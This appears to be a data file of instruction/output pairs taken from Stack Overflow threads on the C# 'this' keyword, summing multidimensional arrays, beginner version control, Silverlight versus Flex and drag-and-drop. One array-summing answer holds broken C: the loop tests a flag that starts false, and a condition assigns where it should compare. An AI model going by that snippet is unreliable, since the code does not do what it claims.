{"instruction": "I am working on a function to establish the entropy of a distribution.  It uses a copula, if any are familiar with that.  I need to sum up the values in the array based on which dimensions are \"cared about.\"\nExample:  Consider the following example... \n\nDimension 0 (across)\n_ _ _ _ _ _ _ _ _ _ _ _ _\n|_ 0 _|_ 0 _|_ 0 _|_ 2 _|  Dimension 1\n|_ 1 _|_ 0 _|_ 2 _|_ 0 _|   (down)\n|_ 0 _|_ 3 _|_ 0 _|_ 6 _|\n|_ 0 _|_ 0 _|_ 0 _|_ 0 _|\n\nI \"care about\" dimension 0 only, and \"don't care\" about the rest (dim 1).\nSumming this array with the above specifications will\n\"collapse\" the \"stacks\" of dimension 1 down to a single 4 x 1 array:\n\n_ _ _ _ _ _ _ _ _ _ _ _ _ \n|_ 1 _|_ 3 _|_ 2 _|_ 8 _|\n\nThis can then be summed, or have any operation performed.\n\nI need to do this with an array of 'n' dimensions, which could feasibly be 20. Also, I need to be able to do this, caring about certain dimensions, and collapsing the rest.  I am having an especially hard time with this because I cant visualize 20 dimensions :p . If anyone could help me set up some c/c++ code to collapse/sum, I would be very very grateful.  \nUpdate:\nJust got home.  Here is some info to answer your questions:\n\nSorry for rolling back the edits, I was hoping when I clicked roll-back it would show me the changes so I could see what I messed up, a bit like wikipedia.  This wasn't the case, as I found out.\n@jeff - What doesnt make sense?  I am using this great service for (what I think is) a legit reason.  I want to get better at my hobby, which is all it is, as I am in high school.  Many of my posts regard implementing a genetic algorithm (This post, sparsearray, rank an array, pointer manipulation).\nI am using a sparse array representation, as it is possible to exceed the number of molecules in the universe using a traditional (dense) array.  For now, the implementation of the sparsearray itself doesnt matter a whole lot, as I am working to make it work with a standard array before going to a sparse representation.  For those who havent seen my previous questions, I am using a binary search tree as the structure to contain the sparse array points, and a \"driver\" function to traverse the tree as necessary, returning whatever the function is designed to do.  This is flexible, so I can accomodate a lot of different methods of accessing the array. \nThe structure is a hypercube, and the number of dimensions is specified at run time, as well as the length of each dimension (which are all the same, as it is a hypercube).\n\nThanks everyone for your imput.", "output": "When you say you don't know how many dimensions there are, how exactly are you defining the data structures?\nAt some point, someone needs to create this array, and to do that, they need to know the dimensions of the array. You can force the creator to pass in this data along with the array.\nUnless the question is to define such a data structure..."}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "I use it every time I refer to an instance variable, even if I don't need to. I think it makes the code more clear."}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "I use it anywhere there might be ambiguity (obviously). Not just compiler ambiguity (it would be required in that case), but also ambiguity for someone looking at the code."}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "I tend to underscore fields with _ so don't really ever need to use this. Also R# tends to refactor them away anyway..."}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "You should always use it, I use it to diferantiate private fields and parameters (because our naming conventions state that we don't use prefixes for member and parameter names (and they are based on information found on the internet, so I consider that a best practice))"}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "I only use it when absolutely necessary, ie, when another variable is shadowing another.  Such as here:\nclass Vector3\n{\n    float x;\n    float y;\n    float z;\n\n    public Vector3(float x, float y, float z)\n    {\n        this.x = x;\n        this.y = y;\n        this.z = z;\n    }\n\n}\n\nOr as Ryan Fox points out, when you need to pass this as a parameter."}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "Any time you need a reference to the current object.\nOne particularly handy scenario is when your object is calling a function and wants to pass itself into it.\nExample:\nvoid onChange()\n{\n    screen.draw(this);\n}"}
{"instruction": "I am working on a function to establish the entropy of a distribution.  It uses a copula, if any are familiar with that.  I need to sum up the values in the array based on which dimensions are \"cared about.\"\nExample:  Consider the following example... \n\nDimension 0 (across)\n_ _ _ _ _ _ _ _ _ _ _ _ _\n|_ 0 _|_ 0 _|_ 0 _|_ 2 _|  Dimension 1\n|_ 1 _|_ 0 _|_ 2 _|_ 0 _|   (down)\n|_ 0 _|_ 3 _|_ 0 _|_ 6 _|\n|_ 0 _|_ 0 _|_ 0 _|_ 0 _|\n\nI \"care about\" dimension 0 only, and \"don't care\" about the rest (dim 1).\nSumming this array with the above specifications will\n\"collapse\" the \"stacks\" of dimension 1 down to a single 4 x 1 array:\n\n_ _ _ _ _ _ _ _ _ _ _ _ _ \n|_ 1 _|_ 3 _|_ 2 _|_ 8 _|\n\nThis can then be summed, or have any operation performed.\n\nI need to do this with an array of 'n' dimensions, which could feasibly be 20. Also, I need to be able to do this, caring about certain dimensions, and collapsing the rest.  I am having an especially hard time with this because I cant visualize 20 dimensions :p . If anyone could help me set up some c/c++ code to collapse/sum, I would be very very grateful.  \nUpdate:\nJust got home.  Here is some info to answer your questions:\n\nSorry for rolling back the edits, I was hoping when I clicked roll-back it would show me the changes so I could see what I messed up, a bit like wikipedia.  This wasn't the case, as I found out.\n@jeff - What doesnt make sense?  I am using this great service for (what I think is) a legit reason.  I want to get better at my hobby, which is all it is, as I am in high school.  Many of my posts regard implementing a genetic algorithm (This post, sparsearray, rank an array, pointer manipulation).\nI am using a sparse array representation, as it is possible to exceed the number of molecules in the universe using a traditional (dense) array.  For now, the implementation of the sparsearray itself doesnt matter a whole lot, as I am working to make it work with a standard array before going to a sparse representation.  For those who havent seen my previous questions, I am using a binary search tree as the structure to contain the sparse array points, and a \"driver\" function to traverse the tree as necessary, returning whatever the function is designed to do.  This is flexible, so I can accomodate a lot of different methods of accessing the array. \nThe structure is a hypercube, and the number of dimensions is specified at run time, as well as the length of each dimension (which are all the same, as it is a hypercube).\n\nThanks everyone for your imput.", "output": "You're doing this in c/c++... so you have an array of array of array... you don't have to visualize 20 dimensions since that isn't how the data is laid out in memory, for a 2 dimensional:\n[1] --> [1,2,3,4,5,6,...]\n[2] --> [1,2,3,4,5,6,...]\n[3] --> [1,2,3,4,5,6,...]\n[4] --> [1,2,3,4,5,6,...]\n[5] --> [1,2,3,4,5,6,...]\n .           .\n .           .\n .           .\n\nso, why can't you iterate across the first one summing it's contents? If you are trying to find the size, then sizeof(array)/sizeof(int) is a risky approach. You must know the dimension to be able to process this data, and set the memory up, so you know the depth of recursion to sum. Here is some pseudo code of what it seems you should do, \nsum( n_matrix, depth )\n  running_total = 0\n  if depth = 0 then\n    foreach element in the array\n      running_total += elm\n  else \n     foreach element in the array\n       running_total += sum( elm , depth-1 )\n  return running_total"}
{"instruction": "Does anyone know how IE7 determines what Security Zone to use for a site?  I see the basics for IE6 here, but I can't find the equivalent for IE7.", "output": "Not sure what the confusion is. Sites on your intranet are in the intranet zone, web sites are in the internet zone, and sites on your computer are in the local zone, unless you've specifically overridden something in the browser's preferences."}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "I pretty much only use this when referencing a type property from inside the same type.  As another user mentioned, I also underscore local fields so they are noticeable without needing this."}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "It depends on the coding standard I'm working under.  If we are using _ to denote an instance variable then \"this\" becomes redundant. If we are not using _ then I tend to use this to denote instance variable."}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "I tend to use it everywhere as well, just to make sure that it is clear that it is instance members that we are dealing with."}
{"instruction": "I am working on a function to establish the entropy of a distribution.  It uses a copula, if any are familiar with that.  I need to sum up the values in the array based on which dimensions are \"cared about.\"\nExample:  Consider the following example... \n\nDimension 0 (across)\n_ _ _ _ _ _ _ _ _ _ _ _ _\n|_ 0 _|_ 0 _|_ 0 _|_ 2 _|  Dimension 1\n|_ 1 _|_ 0 _|_ 2 _|_ 0 _|   (down)\n|_ 0 _|_ 3 _|_ 0 _|_ 6 _|\n|_ 0 _|_ 0 _|_ 0 _|_ 0 _|\n\nI \"care about\" dimension 0 only, and \"don't care\" about the rest (dim 1).\nSumming this array with the above specifications will\n\"collapse\" the \"stacks\" of dimension 1 down to a single 4 x 1 array:\n\n_ _ _ _ _ _ _ _ _ _ _ _ _ \n|_ 1 _|_ 3 _|_ 2 _|_ 8 _|\n\nThis can then be summed, or have any operation performed.\n\nI need to do this with an array of 'n' dimensions, which could feasibly be 20. Also, I need to be able to do this, caring about certain dimensions, and collapsing the rest.  I am having an especially hard time with this because I cant visualize 20 dimensions :p . If anyone could help me set up some c/c++ code to collapse/sum, I would be very very grateful.  \nUpdate:\nJust got home.  Here is some info to answer your questions:\n\nSorry for rolling back the edits, I was hoping when I clicked roll-back it would show me the changes so I could see what I messed up, a bit like wikipedia.  This wasn't the case, as I found out.\n@jeff - What doesnt make sense?  I am using this great service for (what I think is) a legit reason.  I want to get better at my hobby, which is all it is, as I am in high school.  Many of my posts regard implementing a genetic algorithm (This post, sparsearray, rank an array, pointer manipulation).\nI am using a sparse array representation, as it is possible to exceed the number of molecules in the universe using a traditional (dense) array.  For now, the implementation of the sparsearray itself doesnt matter a whole lot, as I am working to make it work with a standard array before going to a sparse representation.  For those who havent seen my previous questions, I am using a binary search tree as the structure to contain the sparse array points, and a \"driver\" function to traverse the tree as necessary, returning whatever the function is designed to do.  This is flexible, so I can accomodate a lot of different methods of accessing the array. \nThe structure is a hypercube, and the number of dimensions is specified at run time, as well as the length of each dimension (which are all the same, as it is a hypercube).\n\nThanks everyone for your imput.", "output": "@Jeff\nI actually think this is an interesting question. I'm not sure how useful it is, but it is a valid question.\n@Ed\nCan you provide a little more info on this question? You said the dimension of the array is dynamic, but is the number of elements dynamic as well?\nEDIT: I'm going to try and answer the question anyways. I can't give you the code off the top of my head (it would take a while to get it right without any compiler here on this PC), but I can point you in the right direction ...\nLet's use 8 dimensions (0-7) with indexes 0 to 3 as an example. You care about only 1,2 and 6. This means you have two arrays. First, array_care[4][4][4] for 1,2, and 6. The array_care[4][4][4] will hold the end result.\nNext, we want to iterate in a very specific way. We have the array input[4][4][4][4][4][4][4][4] to parse through, and we care about dimensions 1, 2, and 6.\nWe need to define some temporary indexes:\nint dim[8] = {0,0,0,0,0,0,0,0};\n\nWe also need to store the order in which we want to increase the indexes:\nint increase_index_order[8] = {7,5,4,3,0,6,2,1};\nint i = 0;\n\nThis order is important for doing what you requested.\nDefine a termination flag:\nbool terminate=false;\n\nNow we can create our loop:\nwhile (terminate)\n{\narray_care[dim[1]][dim[2]][dim[6]] += input[dim[0]][dim[1]][dim[2]][dim[3]][dim[4]][dim[5]][dim[6]][dim[7]];\n\nwhile ((dim[increase_index_order[i]] = 3) && (i < 8))\n{\ndim[increase_index_order[i]]=0;\ni++;\n}\n\nif (i < 8) {\ndim[increase_index_order[i]]++; i=0;\n} else {\nterminate=true;\n}\n}\n\nThat should work for 8 dimensions, caring about 3 dimensions. It would take a bit more time to make it dynamic, and I don't have the time. Hope this helps. I apologize, but I haven't learned the code markups yet. :("}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "I can't believe all of the people that say using it always is a \"best practice\" and such.\nUse \"this\" when there is ambiguity, as in Corey's example or when you need to pass the object as a parameter, as in Ryan's example. There is no reason to use it otherwise because being able to resolve a variable based on the scope chain should be clear enough that qualifying variables with it should be unnecessary.\nEDIT: The C# documentation on \"this\" indicates one more use, besides the two I mentioned, for the \"this\" keyword - for declaring indexers\nEDIT: @Juan: Huh, I don't see any inconsistency in my statements - there are 3 instances when I would use the \"this\" keyword (as documented in the C# documentation), and those are times when you actually need it. Sticking \"this\" in front of variables in a constructor when there is no shadowing going on is simply a waste of keystrokes and a waste of my time when reading it, it provides no benefit."}
{"instruction": "I am working on a function to establish the entropy of a distribution.  It uses a copula, if any are familiar with that.  I need to sum up the values in the array based on which dimensions are \"cared about.\"\nExample:  Consider the following example... \n\nDimension 0 (across)\n_ _ _ _ _ _ _ _ _ _ _ _ _\n|_ 0 _|_ 0 _|_ 0 _|_ 2 _|  Dimension 1\n|_ 1 _|_ 0 _|_ 2 _|_ 0 _|   (down)\n|_ 0 _|_ 3 _|_ 0 _|_ 6 _|\n|_ 0 _|_ 0 _|_ 0 _|_ 0 _|\n\nI \"care about\" dimension 0 only, and \"don't care\" about the rest (dim 1).\nSumming this array with the above specifications will\n\"collapse\" the \"stacks\" of dimension 1 down to a single 4 x 1 array:\n\n_ _ _ _ _ _ _ _ _ _ _ _ _ \n|_ 1 _|_ 3 _|_ 2 _|_ 8 _|\n\nThis can then be summed, or have any operation performed.\n\nI need to do this with an array of 'n' dimensions, which could feasibly be 20. Also, I need to be able to do this, caring about certain dimensions, and collapsing the rest.  I am having an especially hard time with this because I cant visualize 20 dimensions :p . If anyone could help me set up some c/c++ code to collapse/sum, I would be very very grateful.  \nUpdate:\nJust got home.  Here is some info to answer your questions:\n\nSorry for rolling back the edits, I was hoping when I clicked roll-back it would show me the changes so I could see what I messed up, a bit like wikipedia.  This wasn't the case, as I found out.\n@jeff - What doesnt make sense?  I am using this great service for (what I think is) a legit reason.  I want to get better at my hobby, which is all it is, as I am in high school.  Many of my posts regard implementing a genetic algorithm (This post, sparsearray, rank an array, pointer manipulation).\nI am using a sparse array representation, as it is possible to exceed the number of molecules in the universe using a traditional (dense) array.  For now, the implementation of the sparsearray itself doesnt matter a whole lot, as I am working to make it work with a standard array before going to a sparse representation.  For those who havent seen my previous questions, I am using a binary search tree as the structure to contain the sparse array points, and a \"driver\" function to traverse the tree as necessary, returning whatever the function is designed to do.  This is flexible, so I can accomodate a lot of different methods of accessing the array. \nThe structure is a hypercube, and the number of dimensions is specified at run time, as well as the length of each dimension (which are all the same, as it is a hypercube).\n\nThanks everyone for your imput.", "output": "x = number_of_dimensions;\nwhile (x > 1)\n{\n  switch (x)\n  {\n    case 20:\n      reduce20DimensionArray();\n      x--;\n    break;\n    case 19:\n      .....\n  }\n}\n\n(Sorry, couldn't resist.)"}
{"instruction": "What would be the best version control system to learn as a beginner to source control?", "output": "Anything, but I would learn a modern system like git or subversion myself. My first VCS was RCS, but I got the basics down."}
{"instruction": "What would be the best version control system to learn as a beginner to source control?", "output": "Well, if you are just wanting to learn on your own, I would say you should go with something free, like subversion.  If you are a company who has never used source control before, then it really depends on your needs."}
{"instruction": "What would be the best version control system to learn as a beginner to source control?", "output": "I'd suggest you try Subversion, for example with the 1-click SVN installer. Try searching SO for \"Subversion\", and you'll find loads of questions with answers that point to good tutorials.\nGood luck!"}
{"instruction": "What would be the best version control system to learn as a beginner to source control?", "output": "My first exposure was CVS with WinCVS as a client.  it was horrid.  Next was Subversion, with TortoiseSVN and Eclipse's integration.  It was intuitive, and heavenly.  I think that using CVS with TortoiseCVS and Eclipse's would be nice as well, though I prefer the way SVN handles revisioning. The entire repository is versioned with each check in, not individual files."}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "Never. Ever. If you have variable shadowing, your naming conventions are on crack. I mean, really, no distinguishing naming for member variables? Facepalm"}
{"instruction": "What would be the best version control system to learn as a beginner to source control?", "output": "There are a few core concepts that I think are important to learn:\n\nCheck-ins/check-outs (obviously)\nLocal versions vs. server versions\nMapping/Binding a local workspace to a remote store or repository.\nMerging your changes back into a file that contains changes from\nothers.\nBranching (what it is, when/why to use it)\nMerging changes from a branch back into a main branch or trunk.\n\nMost modern source control systems require some knowledge of the above topics and should help facilitate you learning them. Then you have distributed source control, which I don't have any experience with but is supposed to be fairly complicated and may not be suitable for a beginner.\nSubversion is great because it has all of the modern features you'd want and is free.\nGit is also becoming an increasingly popular option and is another free or very low cost alternative to Subversion. Knowledge regarding the concepts of branching and merging become critical for using Git, however.\nYou can use unfuddle as a free and easy way to experiment with both Git and Subversion. I use it to host a couple of subversion repositories for some side projects I've worked on in the past."}
{"instruction": "My company develops several types of applications.  A lot of our business comes from doing multimedia-type apps, typically done in Flash.  However, now that side of the house is starting to migrate towards doing Flex development.\nMost of our other development is done using .NET.  I'm trying to make a push towards doing Silverlight development instead, since it would take better advantage of the .NET developers on staff.  I prefer the Silverlight platform over the Flex platform for the simple fact that Silverlight is all .NET code.  We have more .NET developers on staff than Flash/Flex developers, and most of our Flash/Flex developers are graphic artists (not real programmers).  Only reason they push towards Flex right now is because it seems like the logical step from Flash.\nI've done development using both, and I honestly believe Silverlight is easier to work with.  But I'm trying to convince people who are only Flash developers. \nSo here's my question:  If I'm going to go into a meeting to praise Silverlight, why would a company want to go with Silverlight instead of Flex?  Other than the obvious \"not everyone has Silverlight\", what are the pros and cons for each?", "output": "Silverlight programmer's don't know what they're missing out on, when it comes to Flex.  Silverlight lacks the component model and event triggering capabilites that Flex has.  Using XNA, and C#, a friend of mine has to jump through all kinds of hoops to get his Silverlight application to work.  Then, it has to be handed off to a designer to get it to look half way decent.  \nListen to the deepfriedbytes.com podcasts on Silverlight, and you'll hear how even a couple guys that really push Silverlight, acknowledge some of these issues.  (I think, if I recall correctly, one of the guys works for Microsoft, but I could be wrong - I listened to it last week).  They agree that Silverlight isn't quite ready for any huge applications, in its current state.\nI would go with Flex, for a nice clean, straightforward approach - especially if you're already familiar with Flash and ActionScript 3.0.  Flex makes alot more sense, in my opinion - Silverlight still has to mature."}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "I use it whenever StyleCop tells me to. StyleCop must be obeyed. Oh yes."}
{"instruction": "What would be the best version control system to learn as a beginner to source control?", "output": "Anything but Visual Source Safe; preferably one which supports the concepts of branching and merging. As others have said, Subversion is a great choice, especially with the TortoiseSVN client.\nBe sure to check out (pardon the pun) Eric Sink's classic series of Source Control HOWTO articles."}
{"instruction": "I am working on a function to establish the entropy of a distribution.  It uses a copula, if any are familiar with that.  I need to sum up the values in the array based on which dimensions are \"cared about.\"\nExample:  Consider the following example... \n\nDimension 0 (across)\n_ _ _ _ _ _ _ _ _ _ _ _ _\n|_ 0 _|_ 0 _|_ 0 _|_ 2 _|  Dimension 1\n|_ 1 _|_ 0 _|_ 2 _|_ 0 _|   (down)\n|_ 0 _|_ 3 _|_ 0 _|_ 6 _|\n|_ 0 _|_ 0 _|_ 0 _|_ 0 _|\n\nI \"care about\" dimension 0 only, and \"don't care\" about the rest (dim 1).\nSumming this array with the above specifications will\n\"collapse\" the \"stacks\" of dimension 1 down to a single 4 x 1 array:\n\n_ _ _ _ _ _ _ _ _ _ _ _ _ \n|_ 1 _|_ 3 _|_ 2 _|_ 8 _|\n\nThis can then be summed, or have any operation performed.\n\nI need to do this with an array of 'n' dimensions, which could feasibly be 20. Also, I need to be able to do this, caring about certain dimensions, and collapsing the rest.  I am having an especially hard time with this because I cant visualize 20 dimensions :p . If anyone could help me set up some c/c++ code to collapse/sum, I would be very very grateful.  \nUpdate:\nJust got home.  Here is some info to answer your questions:\n\nSorry for rolling back the edits, I was hoping when I clicked roll-back it would show me the changes so I could see what I messed up, a bit like wikipedia.  This wasn't the case, as I found out.\n@jeff - What doesnt make sense?  I am using this great service for (what I think is) a legit reason.  I want to get better at my hobby, which is all it is, as I am in high school.  Many of my posts regard implementing a genetic algorithm (This post, sparsearray, rank an array, pointer manipulation).\nI am using a sparse array representation, as it is possible to exceed the number of molecules in the universe using a traditional (dense) array.  For now, the implementation of the sparsearray itself doesnt matter a whole lot, as I am working to make it work with a standard array before going to a sparse representation.  For those who havent seen my previous questions, I am using a binary search tree as the structure to contain the sparse array points, and a \"driver\" function to traverse the tree as necessary, returning whatever the function is designed to do.  This is flexible, so I can accomodate a lot of different methods of accessing the array. \nThe structure is a hypercube, and the number of dimensions is specified at run time, as well as the length of each dimension (which are all the same, as it is a hypercube).\n\nThanks everyone for your imput.", "output": "If I understand correctly, you want to sum all values in the cross section defined at each \"bin\" along 1 dimension.  I suggest making a 1D array for your destination, then looping through each element in your array adding the value to the destination with the index of the dimension of interest.\nIf you are using arbitrary number of dimensions, you must have a way of addressing elements (I would be curious how you are implementing this).  Your implementation of this will affect how you set the destination index.  But an obvious way would be with if statements checked in the iteration loops."}
{"instruction": "What would be the best version control system to learn as a beginner to source control?", "output": "I'd also recommend Subversion. It does not take too long to set up, it is free, and there is a really good book available online that goes over the basics as well as some advanced topics: http://svnbook.red-bean.com/"}
{"instruction": "What would be the best version control system to learn as a beginner to source control?", "output": "Subversion with tortoisesvn. (tortoisesvn because you can see a lot of what goes on visually and will provide a good jumping off point for the command line stuff. ) There is tons of documentation out there and most likely you will see it at least one point in your career. Almost every company I have worked for and interviewed with runs SVN."}
{"instruction": "What would be the best version control system to learn as a beginner to source control?", "output": "I found http://unfuddle.com saved me messing about with installing SVN or git. You can get a free account in there and use either of those - plus you can use your OpenID there.\nThen you avoid having to mess about setting it up right and focus on how you're going to use it!"}
{"instruction": "My C# program has a list of files that can be dragged from it and dropped into another program. My requirements are that the file be copied to a different directory first.\nSo, can I be notified of the drop operation so that I can only copy the file if operation succeeds? I'd rather wait till I know it needs to be copied before actually performing the copy.\nAlso, is it possible to know what program the drop operation is occurring in? Ideally I'd like to alter the filepath based on who or what its being dropped.\nThe solution to this can be in any .NET language or C/C++ with COM.", "output": "There are a few ambiguities in your question. What operation needs to be successful?\nFor everything you want to know about drag and drop, browse through these search results (multiple pages worth):\nRaymond Chen on drag and drop"}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "I don't mean this to sound snarky, but it doesn't matter.\nSeriously.\nLook at the things that are important: your project, your code, your job, your personal life. None of them are going to have their success rest on whether or not you use the \"this\" keyword to qualify access to fields. The this keyword will not help you ship on time. It's not going to reduce bugs, it's not going to have any appreciable effect on code quality or maintainability. It's not going to get you a raise, or allow you to spend less time at the office. \nIt's really just a style issue. If you like \"this\", then use it. If you don't, then don't. If you need it to get correct semantics then use it. The truth is, every programmer has his own unique programing style. That style reflects that particular programmer's notions of what the \"most aesthetically pleasing code\" should look like. By definition, any other programmer who reads your code is going to have a different programing style. That means there is always going to be something you did that the other guy doesn't like, or would have done differently. At some point some guy is going to read your code and grumble about something. \nI wouldn't fret over it. I would just make sure the code is as aesthetically pleasing as possible according to your own tastes. If you ask 10 programmers how to format code, you are going to get about 15 different opinions. A better thing to focus on is how the code is factored. Are things abstracted right? Did I pick meaningful names for things? Is there a lot of code duplication? Are there ways I can simplify stuff? Getting those things right, I think, will have the greatest positive impact on your project, your code, your job, and your life. Coincidentally, it will probably also cause the other guy to grumble the least. If your code works, is easy to read, and is well factored, the other guy isn't going to be scrutinizing how you initialize fields. He's just going to use your code, marvel at it's greatness, and then move on to something else."}
{"instruction": "My C# program has a list of files that can be dragged from it and dropped into another program. My requirements are that the file be copied to a different directory first.\nSo, can I be notified of the drop operation so that I can only copy the file if operation succeeds? I'd rather wait till I know it needs to be copied before actually performing the copy.\nAlso, is it possible to know what program the drop operation is occurring in? Ideally I'd like to alter the filepath based on who or what its being dropped.\nThe solution to this can be in any .NET language or C/C++ with COM.", "output": "So, you intend to modify the data being dropped based on the drop target?  I don't think this is possible; after all, you populate the data when the drag is initiated."}
{"instruction": "I am working on a function to establish the entropy of a distribution.  It uses a copula, if any are familiar with that.  I need to sum up the values in the array based on which dimensions are \"cared about.\"\nExample:  Consider the following example... \n\nDimension 0 (across)\n_ _ _ _ _ _ _ _ _ _ _ _ _\n|_ 0 _|_ 0 _|_ 0 _|_ 2 _|  Dimension 1\n|_ 1 _|_ 0 _|_ 2 _|_ 0 _|   (down)\n|_ 0 _|_ 3 _|_ 0 _|_ 6 _|\n|_ 0 _|_ 0 _|_ 0 _|_ 0 _|\n\nI \"care about\" dimension 0 only, and \"don't care\" about the rest (dim 1).\nSumming this array with the above specifications will\n\"collapse\" the \"stacks\" of dimension 1 down to a single 4 x 1 array:\n\n_ _ _ _ _ _ _ _ _ _ _ _ _ \n|_ 1 _|_ 3 _|_ 2 _|_ 8 _|\n\nThis can then be summed, or have any operation performed.\n\nI need to do this with an array of 'n' dimensions, which could feasibly be 20. Also, I need to be able to do this, caring about certain dimensions, and collapsing the rest.  I am having an especially hard time with this because I cant visualize 20 dimensions :p . If anyone could help me set up some c/c++ code to collapse/sum, I would be very very grateful.  \nUpdate:\nJust got home.  Here is some info to answer your questions:\n\nSorry for rolling back the edits, I was hoping when I clicked roll-back it would show me the changes so I could see what I messed up, a bit like wikipedia.  This wasn't the case, as I found out.\n@jeff - What doesnt make sense?  I am using this great service for (what I think is) a legit reason.  I want to get better at my hobby, which is all it is, as I am in high school.  Many of my posts regard implementing a genetic algorithm (This post, sparsearray, rank an array, pointer manipulation).\nI am using a sparse array representation, as it is possible to exceed the number of molecules in the universe using a traditional (dense) array.  For now, the implementation of the sparsearray itself doesnt matter a whole lot, as I am working to make it work with a standard array before going to a sparse representation.  For those who havent seen my previous questions, I am using a binary search tree as the structure to contain the sparse array points, and a \"driver\" function to traverse the tree as necessary, returning whatever the function is designed to do.  This is flexible, so I can accomodate a lot of different methods of accessing the array. \nThe structure is a hypercube, and the number of dimensions is specified at run time, as well as the length of each dimension (which are all the same, as it is a hypercube).\n\nThanks everyone for your imput.", "output": "This kind of thing is much easier if you use STL containers, or maybe Boost.MultiArray. But if you must use an array:\n#include <iostream>\n#include <boost/foreach.hpp>\n#include <vector>\n\nint sum(int x) {\n    return x;\n}\n\ntemplate <class T, unsigned N>\nint sum(const T (&x)[N]) {\n    int r = 0;\n    for(int i = 0; i < N; ++i) {\n        r += sum(x[i]);\n    }\n    return r;\n}\n\ntemplate <class T, unsigned N>\nstd::vector<int> reduce(const T (&x)[N]) {\n    std::vector<int> result;\n    for(int i = 0; i < N; ++i) {\n        result.push_back(sum(x[i]));\n    }\n    return result;\n}\n\nint main() {\n    int x[][2][2] = {\n        { { 1, 2 }, { 3, 4 } },\n        { { 5, 6 }, { 7, 8 } }\n    };\n\n    BOOST_FOREACH(int v, reduce(x)) {\n        std::cout<<v<<\"\\n\";\n    }\n}"}
{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "A nightly build of Resharper"}
